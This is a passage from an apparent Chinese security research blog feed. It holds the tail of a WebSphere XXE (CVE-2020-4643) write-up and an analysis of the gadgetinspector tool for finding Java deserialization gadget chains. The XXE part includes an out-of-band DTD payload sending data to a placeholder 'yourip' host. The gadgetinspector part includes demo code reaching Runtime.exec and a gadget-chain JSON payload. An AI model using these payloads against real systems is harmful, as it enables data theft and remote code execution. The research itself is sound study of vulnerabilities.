class="line">xx.dtd如下：</span><br><span class="line">&lt;!ENTITY % ccc &apos;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=&quot;uri&quot; location=&quot;http://yourip:8000/xxeLog?%aaa;&quot;/&gt;&amp;#39;&gt;&apos;&gt;%ccc;</span><br></pre></td></tr></table></figure><p><img src="images/CVE-2020-4643/2.png" alt=""></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>我们只看了浮在表面上的一些地方，人工最多只看了两层调用，也许RCE隐藏在更深的地方或者知识盲点现在没找到呢，还是得有个属于自己的能查找链的工具，工具不会累，人会。</p>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Websphere IIOP远程代码执行漏洞(CVE-2020-4450)分析</title>
      <link href="/Websphere%20IIOP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-4450)%E5%88%86%E6%9E%90.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>已经有人先发了分析，就不再发了<br><img src="images/CVE-2020-4450/1.png" alt=""><br><img src="images/CVE-2020-4450/2.png" alt=""></p></blockquote>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>F5 BIG-IP hsqldb踩坑分析(CVE-2020-5902)</title>
      <link href="/F5%20BIG-IP%20hsqldb%E8%B8%A9%E5%9D%91%E5%88%86%E6%9E%90(CVE-2020-5902).html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>已发布到paper.seebug，<a href="https://paper.seebug.org/1271/" target="_blank" rel="noopener">https://paper.seebug.org/1271/</a><br><img src="images/f5-big-ip/1.png" alt=""></p></blockquote>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Java反序列化工具gadgetinspector原理初窥</title>
      <link href="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7gadgetinspector%E5%8E%9F%E7%90%86%E5%88%9D%E7%AA%A5.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>记录下自己初步研究gadgetinspector这个工具的一些东西吧</p></blockquote><a id="more"></a><h2 id="Java反序列化工具gadgetinspector初窥"><a href="#Java反序列化工具gadgetinspector初窥" class="headerlink" title="Java反序列化工具gadgetinspector初窥"></a>Java反序列化工具gadgetinspector初窥</h2><p><strong>作者：Longofo</strong></p><p><strong>时间：2019年9月4日</strong> </p><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>一开始是听@Badcode师傅说的这个工具，在Black Hat 2018的一个议题提出来的。这是一个基于字节码静态分析的、利用已知技巧自动查找从source到sink的反序列化利用链工具。看了几遍作者在Black Hat上的<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">演讲视频</a>与<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">PPT</a>，想从作者的演讲与PPT中获取更多关于这个工具的原理性的东西，可是有些地方真的很费解。不过作者开源了这个<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">工具</a>，但没有给出详细的说明文档，对这个工具的分析文章也很少，看到一篇平安集团对这个工具的<a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">分析</a>，从文中描述来看，他们对这个工具应该有一定的认识并做了一些改进，但是在文章中对某些细节没有做过多的阐释。后面尝试了调试这个工具，大致理清了这个工具的工作原理，下面是对这个工具的分析过程，以及对未来工作与改进的设想。</p><h3 id="关于这个工具"><a href="#关于这个工具" class="headerlink" title="关于这个工具"></a>关于这个工具</h3><ul><li>这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。</li><li>这个工具是在整个应用的classpath中寻找利用链。</li><li>这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。</li><li>这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。</li><li>这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。</li><li>这个工具不会生成能直接利用的Payload，具体的利用构造还需要人工参与。</li></ul><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>序列化（Serialization）是将对象的状态信息转化为可以存储或者传输形式的过程，转化后的信息可以存储在磁盘上，在网络传输过程中，可以是字节、XML、JSON等格式；而将字节、XML、JSON等格式的信息还原成对象这个相反的过程称为反序列化。</p><p>在JAVA中，对象的序列化和反序列化被广泛的应用到RMI（远程方法调用）及网络传输中。</p><h3 id="Java中的序列化与反序列化库"><a href="#Java中的序列化与反序列化库" class="headerlink" title="Java中的序列化与反序列化库"></a>Java中的序列化与反序列化库</h3><ul><li>JDK(ObjectInputStream)</li><li>XStream(XML,JSON)</li><li>Jackson(XML,JSON)</li><li>Genson(JSON)</li><li>JSON-IO(JSON)</li><li>FlexSON(JSON)</li><li>Fastjson(JSON)</li><li>…</li></ul><p>不同的反序列化库在反序列化不同的类时有不同的行为、被反序列化类的不同”魔术方法”会被<strong>自动调用</strong>，这些被自动调用的方法就能够作为反序列化的入口点(source)。如果这些被自动调用的方法又调用了其他子方法，那么在调用链中某一个子方法也可以作为source，就相当于已知了调用链的前部分，从某个子方法开始寻找不同的分支。通过方法的层层调用，可能到达某些危险的方法(sink)。</p><ul><li><p>ObjectInputStream</p><p>例如某个类实现了Serializable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readObject、readResolve等方法并调用。</p><p>例如某个类实现了Externalizable接口，ObjectInputStream.readobject在反序列化类得到其对象时会自动查找这个类的readExternal等方法并调用。</p></li><li><p>Jackson</p><p>ObjectMapper.readValue在反序列化类得到其对象时，会自动查找反序列化类的无参构造方法、包含一个基础类型参数的构造方法、属性的setter、属性的getter等方法并调用。</p></li><li><p>…</p></li></ul><p>在后面的分析中，都使用JDK自带的ObjectInputStream作为样例。</p><h3 id="控制数据类型-gt-控制代码"><a href="#控制数据类型-gt-控制代码" class="headerlink" title="控制数据类型=&gt;控制代码"></a>控制数据类型=&gt;控制代码</h3><p>作者说，在反序列化漏洞中，如果控制了数据类型，我们就控制了代码。这是什么意思呢？按我的理解，写了下面的一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestDeserialization</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Animal</span>,<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"cat eat fish"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Animal</span>,<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"dog eat bone"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Animal pet;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Animal pet)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.pet = pet;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            pet = (Animal) stream.readObject();</span><br><span class="line">            pet.eat();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//将构造好的payload序列化后写入文件中</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//读取写入的payload，并进行反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Animal animal = <span class="keyword">new</span> Dog();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(animal);</span><br><span class="line">        GeneratePayload(person,<span class="string">"test.ser"</span>);</span><br><span class="line">        payloadTest(<span class="string">"test.ser"</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        Animal animal = new Cat();</span></span><br><span class="line"><span class="comment">//        Person person = new Person(animal);</span></span><br><span class="line"><span class="comment">//        GeneratePayload(person,"test.ser");</span></span><br><span class="line"><span class="comment">//        payloadTest("test.ser");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便我把所有类写在一个类中进行测试。在Person中类中，有一个Animal类的属性pet，它是Cat和Dog的接口。在序列化时，我们能够控制Persion的pet具体是Cat对象或者Dog对象，因此在反序列化时，在readObject中<code>pet.eat()</code>具体的走向就不一样了。如果是pet是Cat类对象，就不会走到执行有害代码<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这一步，但是如果pet是Dog类的对象，就会走到有害代码。</p><p>即使有时候类属性在声明时已经为它赋值了某个具体的对象，但是在Java中通过反射等方式依然能修改。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">public class TestDeserialization &#123;</span><br><span class="line"></span><br><span class="line">    interface Animal &#123;</span><br><span class="line">        public void eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Cat implements Animal, Serializable &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void eat() &#123;</span><br><span class="line">            System.out.println(&quot;cat eat fish&quot;);</span><br><span class="line">        &#125;                           </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Dog implements Animal, Serializable &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void eat() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;dog eat bone&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static class Person implements Serializable &#123;</span><br><span class="line">        private Animal pet = new Cat();</span><br><span class="line"></span><br><span class="line">        private void readObject(java.io.ObjectInputStream stream)</span><br><span class="line">                throws IOException, ClassNotFoundException &#123;</span><br><span class="line">            pet = (Animal) stream.readObject();</span><br><span class="line">            pet.eat();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GeneratePayload(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        //将构造好的payload序列化后写入文件中</span><br><span class="line">        File f = new File(file);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //读取写入的payload，并进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Animal animal = new Dog();</span><br><span class="line">        Person person = new Person();</span><br><span class="line"></span><br><span class="line">        //通过反射修改私有属性</span><br><span class="line">        Field field = person.getClass().getDeclaredField(&quot;pet&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(person, animal);</span><br><span class="line"></span><br><span class="line">        GeneratePayload(person, &quot;test.ser&quot;);</span><br><span class="line">        payloadTest(&quot;test.ser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Person类中，不能通过构造器或setter方法或其他方式对pet赋值，属性在声明时已经被定义为Cat类的对象，但是通过反射能将pet修改为Dog类的对象，因此在反序列化时依然会走到有害代码处。</p><p>这只是我自己对作者：”控制了数据类型，就控制了代码”的理解，在Java反序列化漏洞中，很多时候是利用到了Java的多态特性来控制代码走向最后达到恶意执行目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在上面的例子中，能看到在反序列化时没有调用Person的readobject方法，它是ObjectInputStream在反序列化对象时自动调用的。作者将在反序列化中会自动调用的方法称为”魔术方法”。</p><p>使用ObjectInputStream反序列化时几个常见的魔术方法：</p><ul><li>Object.readObject()</li><li>Object.readResolve()</li><li>Object.finalize()</li><li>…</li></ul><p>一些可序列化的JDK类实现了上面这些方法并且还自动调用了其他方法（可以作为已知的入口点）：</p><ul><li>HashMap<ul><li>Object.hashCode()</li><li>Object.equals()</li></ul></li><li>PriorityQueue<ul><li>Comparator.compare()</li><li>Comparable.CompareTo()</li></ul></li><li>…</li></ul><p>一些sink：</p><ul><li>Runtime.exec()，这种最为简单直接，即直接在目标环境中执行命令</li><li>Method.invoke()，这种需要适当地选择方法和参数，通过反射执行Java方法</li><li>RMI/JNDI/JRMP等，通过引用远程对象，间接实现任意代码执行的效果</li><li>…</li></ul><p>作者给出了一个从Magic Methods(source)-&gt;Gadget Chains-&gt;Runtime.exec(sink)的例子：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/1.png" alt=""></p><p>上面的HashMap实现了readObject这个”魔术方法”，并且调用了hashCode方法。某些类为了比较对象之间是否相等会实现equals方法（一般是equals和hashCode方法同时实现）。从图中可以看到AbstractTableModel$ff19274a正好实现了hashCode方法，其中又调用了<code>f.invoke</code>方法，f是IFn对象，并且f能通过属性<code>__clojureFnMap</code>获取到。IFn是一个接口，上面说到，如果控制了数据类型，就控制了代码走向。所以如果我们在序列化时，在<code>__clojureFnMap</code>放置IFn接口的实现类FnCompose的一个对象，那么就能控制<code>f.invoke</code>走<code>FnCompose.invoke</code>方法，接着控制FnCompose.invoke中的f1、f2为FnConstant就能到达FnEval.invoke了（关于AbstractTableModel$ff19274a.hashcode中的<code>f.invoke</code>具体选择IFn的哪个实现类，根据后面对这个工具的测试以及对决策原理的分析，广度优先会选择短的路径，也就是选择了FnEval.invoke，所以这也是为什么要人为参与，在后面的样例分析中也可以看到）。</p><p>有了这条链，只需要找到触发这个链的漏洞点就行了。Payload使用JSON格式表示如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@class"</span>:<span class="string">"java.util.HashMap"</span>,</span><br><span class="line">    <span class="attr">"members"</span>:[</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"@class"</span>:<span class="string">"AbstractTableModel$ff19274a"</span>,</span><br><span class="line">            <span class="attr">"__clojureFnMap"</span>:&#123;</span><br><span class="line">                <span class="attr">"hashcode"</span>:&#123;</span><br><span class="line">                    <span class="attr">"@class"</span>:<span class="string">"FnCompose"</span>,</span><br><span class="line">                    "f1":&#123;"@class","FnConstant",value:"calc"&#125;,</span><br><span class="line">                    "f2":&#123;"@class":"FnEval"&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="gadgetinspector工作流程"><a href="#gadgetinspector工作流程" class="headerlink" title="gadgetinspector工作流程"></a>gadgetinspector工作流程</h3><p>如作者所说，正好使用了五个步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 枚举全部类以及类的所有方法</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"classes.dat"</span>)) || !Files.exists(Paths.get(<span class="string">"methods.dat"</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">"inheritanceMap.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Running method discovery..."</span>);</span><br><span class="line">    MethodDiscovery methodDiscovery = <span class="keyword">new</span> MethodDiscovery();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成passthrough数据流</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"passthrough.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Analyzing methods for passthrough dataflow..."</span>);</span><br><span class="line">    PassthroughDiscovery passthroughDiscovery = <span class="keyword">new</span> PassthroughDiscovery();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成passthrough调用图</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"callgraph.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Analyzing methods in order to build a call graph..."</span>);</span><br><span class="line">    CallGraphDiscovery callGraphDiscovery = <span class="keyword">new</span> CallGraphDiscovery();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索可用的source</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">"sources.dat"</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Discovering gadget chain source methods..."</span>);</span><br><span class="line">    SourceDiscovery sourceDiscovery = config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//搜索生成调用链</span></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"Searching call graph for gadget chains..."</span>);</span><br><span class="line">    GadgetChainDiscovery gadgetChainDiscovery = <span class="keyword">new</span> GadgetChainDiscovery(config);</span><br><span class="line">    gadgetChainDiscovery.discover();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step1-枚举全部类以及每个类的所有方法"><a href="#Step1-枚举全部类以及每个类的所有方法" class="headerlink" title="Step1 枚举全部类以及每个类的所有方法"></a>Step1 枚举全部类以及每个类的所有方法</h4><p>要进行调用链的搜索，首先得有所有类及所有类方法的相关信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(MethodDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;ClassReference&gt; discoveredClasses = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//保存所有类信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;MethodReference&gt; discoveredMethods = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//保存所有方法信息</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//classResourceEnumerator.getAllClasses()获取了运行时的所有类(JDK rt.jar)以及要搜索应用中的所有类</span></span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);<span class="comment">//通过ASM框架操作字节码并将类信息保存到this.discoveredClasses，将方法信息保存到discoveredMethods</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Exception analyzing: "</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"classes.dat"</span>), <span class="keyword">new</span> ClassReference.Factory(), discoveredClasses);<span class="comment">//将类信息保存到classes.dat</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"methods.dat"</span>), <span class="keyword">new</span> MethodReference.Factory(), discoveredMethods);<span class="comment">//将方法信息保存到methods.dat</span></span><br><span class="line"></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">            classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        InheritanceDeriver.derive(classMap).save();<span class="comment">//查找所有继承关系并保存</span></span><br><span class="line">    